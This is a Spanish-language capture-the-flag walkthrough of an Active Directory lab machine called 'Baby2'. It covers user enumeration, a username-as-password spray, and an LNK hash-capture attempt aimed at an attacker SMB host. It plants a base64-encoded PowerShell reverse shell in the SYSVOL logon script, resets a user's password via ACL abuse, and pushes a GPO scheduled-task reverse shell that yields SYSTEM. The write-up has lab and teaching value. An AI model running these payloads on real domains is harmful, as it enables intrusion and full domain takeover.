>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.14.189
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 09:57 EST
Nmap scan report for 10.129.14.189
Host is up (0.061s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-13 14:57:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
54992/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54993/tcp open  msrpc         Microsoft Windows RPC
55011/tcp open  msrpc         Microsoft Windows RPC
63477/tcp open  msrpc         Microsoft Windows RPC
63511/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.47 seconds
```

>Enumeramos con netexec datos del DC:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nxc smb 10.129.14.189                                        
SMB         10.129.14.189   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "10.129.14.189 baby2.vl DC dc.baby2.vl" >> /etc/hosts
```

>Enumeración de usuarios mediante la técnica **RID brute-force** empleando **Guest Session**:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nxc smb 10.129.14.189 -u 'guest' -p '' --rid-brute
SMB         10.129.14.189   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.189   445    DC               [+] baby2.vl\guest: 
SMB         10.129.14.189   445    DC               498: BABY2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.14.189   445    DC               500: BABY2\Administrator (SidTypeUser)
SMB         10.129.14.189   445    DC               501: BABY2\Guest (SidTypeUser)
SMB         10.129.14.189   445    DC               502: BABY2\krbtgt (SidTypeUser)
SMB         10.129.14.189   445    DC               512: BABY2\Domain Admins (SidTypeGroup)
SMB         10.129.14.189   445    DC               513: BABY2\Domain Users (SidTypeGroup)
SMB         10.129.14.189   445    DC               514: BABY2\Domain Guests (SidTypeGroup)
SMB         10.129.14.189   445    DC               515: BABY2\Domain Computers (SidTypeGroup)
SMB         10.129.14.189   445    DC               516: BABY2\Domain Controllers (SidTypeGroup)
SMB         10.129.14.189   445    DC               517: BABY2\Cert Publishers (SidTypeAlias)
SMB         10.129.14.189   445    DC               518: BABY2\Schema Admins (SidTypeGroup)
SMB         10.129.14.189   445    DC               519: BABY2\Enterprise Admins (SidTypeGroup)
SMB         10.129.14.189   445    DC               520: BABY2\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.14.189   445    DC               521: BABY2\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.14.189   445    DC               522: BABY2\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.14.189   445    DC               525: BABY2\Protected Users (SidTypeGroup)
SMB         10.129.14.189   445    DC               526: BABY2\Key Admins (SidTypeGroup)
SMB         10.129.14.189   445    DC               527: BABY2\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.14.189   445    DC               553: BABY2\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.14.189   445    DC               571: BABY2\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.14.189   445    DC               572: BABY2\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.14.189   445    DC               1000: BABY2\DC$ (SidTypeUser)
SMB         10.129.14.189   445    DC               1101: BABY2\DnsAdmins (SidTypeAlias)
SMB         10.129.14.189   445    DC               1102: BABY2\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.14.189   445    DC               1103: BABY2\gpoadm (SidTypeUser)
SMB         10.129.14.189   445    DC               1104: BABY2\office (SidTypeGroup)
SMB         10.129.14.189   445    DC               1105: BABY2\Joan.Jennings (SidTypeUser)
SMB         10.129.14.189   445    DC               1106: BABY2\Mohammed.Harris (SidTypeUser)
SMB         10.129.14.189   445    DC               1107: BABY2\Harry.Shaw (SidTypeUser)
SMB         10.129.14.189   445    DC               1108: BABY2\Carl.Moore (SidTypeUser)
SMB         10.129.14.189   445    DC               1109: BABY2\Ryan.Jenkins (SidTypeUser)
SMB         10.129.14.189   445    DC               1110: BABY2\Kieran.Mitchell (SidTypeUser)
SMB         10.129.14.189   445    DC               1111: BABY2\Nicola.Lamb (SidTypeUser)
SMB         10.129.14.189   445    DC               1112: BABY2\Lynda.Bailey (SidTypeUser)
SMB         10.129.14.189   445    DC               1113: BABY2\Joel.Hurst (SidTypeUser)
SMB         10.129.14.189   445    DC               1114: BABY2\Amelia.Griffiths (SidTypeUser)
SMB         10.129.14.189   445    DC               1602: BABY2\library (SidTypeUser)
SMB         10.129.14.189   445    DC               2601: BABY2\legacy (SidTypeGroup)
```

>Tratamos el output anterior para obtener una lista con solo los usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ cat users_raw | grep "SidTypeUser" | awk {'print $2'} FS="\\" | awk {'print $1'} FS="(" | tr -d ' ' > users; cat users
Administrator
Guest
krbtgt
DC$
gpoadm
Joan.Jennings
Mohammed.Harris
Harry.Shaw
Carl.Moore
Ryan.Jenkins
Kieran.Mitchell
Nicola.Lamb
Lynda.Bailey
Joel.Hurst
Amelia.Griffiths
library
```

>Aquí vemos las **shares de SMB** disponibles con nuestra Guest Session:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nxc smb 10.129.14.189 -u 'guest' -p '' --shares
SMB         10.129.14.189   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.189   445    DC               [+] baby2.vl\guest: 
SMB         10.129.14.189   445    DC               [*] Enumerated shares
SMB         10.129.14.189   445    DC               Share           Permissions     Remark
SMB         10.129.14.189   445    DC               -----           -----------     ------
SMB         10.129.14.189   445    DC               ADMIN$                          Remote Admin
SMB         10.129.14.189   445    DC               apps            READ            
SMB         10.129.14.189   445    DC               C$                              Default share
SMB         10.129.14.189   445    DC               docs                            
SMB         10.129.14.189   445    DC               homes           READ,WRITE      
SMB         10.129.14.189   445    DC               IPC$            READ            Remote IPC
SMB         10.129.14.189   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.14.189   445    DC               SYSVOL                          Logon server share 
```

>Hacemos un **password spray** poniendo el nombre del usuario como credencial y vemos dos usuarios con credenciales válidas: `library:library  Carl.Moore:Carl.Moore`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ kerbrute passwordspray -d baby2.vl users --dc 10.129.14.189 -t 300 --user-as-pass    

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/13/26 - Ronnie Flathers @ropnop

2026/01/13 10:05:00 >  Using KDC(s):
2026/01/13 10:05:00 >  	10.129.14.189:88

2026/01/13 10:05:00 >  [+] VALID LOGIN:	library@baby2.vl:library
2026/01/13 10:05:00 >  [+] VALID LOGIN:	Carl.Moore@baby2.vl:Carl.Moore
2026/01/13 10:05:00 >  Done! Tested 16 logins (2 successes) in 0.268 seconds
```

>Ingestamos archivos de bloodhound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ bloodhound-ce-python -u 'Carl.Moore' -p 'Carl.Moore' -k -ns 10.129.14.189 -d baby2.vl -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: baby2.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.baby2.vl
INFO: Testing resolved hostname connectivity dead:beef::44ee:9f9b:d349:83e5
INFO: Trying LDAP connection to dead:beef::44ee:9f9b:d349:83e5
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.baby2.vl
INFO: Testing resolved hostname connectivity dead:beef::44ee:9f9b:d349:83e5
INFO: Trying LDAP connection to dead:beef::44ee:9f9b:d349:83e5
INFO: Found 16 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.baby2.vl
ERROR: Unhandled exception in computer dc.baby2.vl processing: The NETBIOS connection with the remote host timed out.
INFO: Done in 00M 15S
INFO: Compressing output into 20260113100859_bloodhound.zip
```

>Por ahora vemos que ningún usuario del que dispongamos acceso tiene ACLs interesantes, así que vamos a enumerar las shares y vemos que library tiene privilegios de **READ,WRITE** sobre 3 shares:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ nxc smb 10.129.14.189 -u 'library' -p 'library' --shares
SMB         10.129.14.189   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.189   445    DC               [+] baby2.vl\library:library 
SMB         10.129.14.189   445    DC               [*] Enumerated shares
SMB         10.129.14.189   445    DC               Share           Permissions     Remark
SMB         10.129.14.189   445    DC               -----           -----------     ------
SMB         10.129.14.189   445    DC               ADMIN$                          Remote Admin
SMB         10.129.14.189   445    DC               apps            READ,WRITE      
SMB         10.129.14.189   445    DC               C$                              Default share
SMB         10.129.14.189   445    DC               docs            READ,WRITE      
SMB         10.129.14.189   445    DC               homes           READ,WRITE      
SMB         10.129.14.189   445    DC               IPC$            READ            Remote IPC
SMB         10.129.14.189   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.14.189   445    DC               SYSVOL          READ            Logon server share
```

>En la share **apps**, vemos un archivo lnk que podríamos sustituir por uno malicioso para obtener el **hash NTLMv2** del usuario que lo abra:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ smbclient -U "library%library" '\\10.129.14.189\apps'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 13 10:12:56 2026
  ..                                  D        0  Tue Aug 22 16:10:21 2023
  dev                                 D        0  Thu Sep  7 15:13:50 2023

		6126847 blocks of size 4096. 1274863 blocks available
smb: \> cd dev
smb: \dev\> ls
  .                                   D        0  Thu Sep  7 15:13:50 2023
  ..                                  D        0  Tue Jan 13 10:12:56 2026
  CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023
  login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023
```

>Vamos a crear el lnk malicioso:

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\10.10.14.71\@malicious.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

>Lo subimos, como no hay acceso al archivo original vamos a probar a ver si abre otros archivos lnk, pero esto no hace nada:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ smbclient -U "library%library" '\\10.129.14.189\apps'
Try "help" to get a list of possible commands.
smb: \> cd dev
smb: \dev\> put legit.lnk
putting file legit.lnk as \dev\legit.lnk (6.8 kB/s) (average 6.8 kB/s)
smb: \dev\> exit
```

>Entonces vamos a enumerar otras shares, en este caso, en la de **SYSVOL** vemos un logon script en **VBS**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ smbclient -U "library%library" '\\10.129.14.189\SYSVOL'
Try "help" to get a list of possible commands.
smb: \> cd baby2.vl\scripts\
smb: \baby2.vl\scripts\> get login.vbs 
getting file \baby2.vl\scripts\login.vbs of size 992 as login.vbs (3.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
```

>Y vemos que el contenido del script es el siguiente:

```vb
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ cat login.vbs                                                                                                         
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"  
```

>Lo modificamos para que nos de una reverse shell:

```vb
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ cat login.vbs                                                                                                         
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

CreateObject("WScript.Shell").Run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=", 0, True

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"  
```

>Subimos el archivo modificado y recibimos la reverse shell como el usuario **amelia.griffiths**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ smbclient -U "library%library" '\\10.129.14.189\SYSVOL'
Try "help" to get a list of possible commands.
smb: \> cd baby2.vl\scripts\
smb: \baby2.vl\scripts\> put login.vbs
putting file login.vbs as \baby2.vl\scripts\login.vbs (9.9 kB/s) (average 9.9 kB/s)
smb: \baby2.vl\scripts\> exit
```

```bash
┌──(kali㉿jbkira)-[~]
└─$ rlwrap nc -nlvp 443                  
listening on [any] 443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.14.189] 64235

PS C:\Windows\system32> whoami
baby2\amelia.griffiths
```

>Vemos que el usuario **amelia.griffiths** posee las ACEs **WriteDacl** y **WriteOwner** sobre la OU **GPO-MANAGEMENT** y el usuario **GPOADM**:

<img width="893" height="328" alt="image" src="https://github.com/user-attachments/assets/caf42820-fbd4-44d1-8437-722f8b1e713a" />

>Leemos primero la user flag:

```powershell
PS C:\> cat user.txt
42783b2c1483aeb70eca6810f0645c38
```

>Vamos a abusar la ACE **WriteDacl** sobre el usuario **GPOADM** para darnos control total sobre el usuario y luego cambiarle la contraseña usando **PowerView.ps1**:

```powershell
PS C:\tools> add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"
PS C:\tools> $cred = ConvertTo-SecureString 'Password123$!' -AsPlainText -Force
PS C:\tools> set-domainuserpassword gpoadm -accountpassword $cred
```

>Comprobamos que las credenciales se han modificado correctamente:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
└─$ nxc smb 10.129.14.189 -u 'gpoadm' -p 'Password123$!'
SMB         10.129.14.189   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.189   445    DC               [+] baby2.vl\gpoadm:Password123$!
```

>Vemos que el usuario **gpoadm** tiene la ACE **GenericAll** sobre 2 GPOs, la que nos interesa es la de **Default Domain Policy**:

<img width="1121" height="232" alt="image" src="https://github.com/user-attachments/assets/9402a18b-5755-435a-9359-49bf10b91736" />

>Vamos a usar **pyGPOAbuse** para crear en la **GPO** una task que nos reenvie una **reverse shell**: https://github.com/Hackndo/pyGPOAbuse

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo/pyGPOAbuse]
└─$ python3 pygpoabuse.py 'baby2.vl/gpoadm:Password123$!' -command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAxACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" -dc-ip 10.129.14.189 -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9"
SUCCESS:root:ScheduledTask TASK_68774013 created!
[+] ScheduledTask TASK_68774013 created!
```

>El id de la GPO lo obtenemos de bloodhound:

<img width="352" height="534" alt="image" src="https://github.com/user-attachments/assets/4a578556-cf31-47f8-8d80-079f171af2f6" />

>Ahora vamos a hacer un `gpupdate` para guardar los cambios en la **GPO** como el usuario **amelia.griffiths**:

```bash
PS C:\Windows\system32> gpupdate
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

>Y recibimos una shell como **SYSTEM** y leemos la última flag:

```bash
┌──(kali㉿jbkira)-[~]
└─$ rlwrap nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.14.189] 64769

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
293500962edc31fa154951eeeb5740f9
```
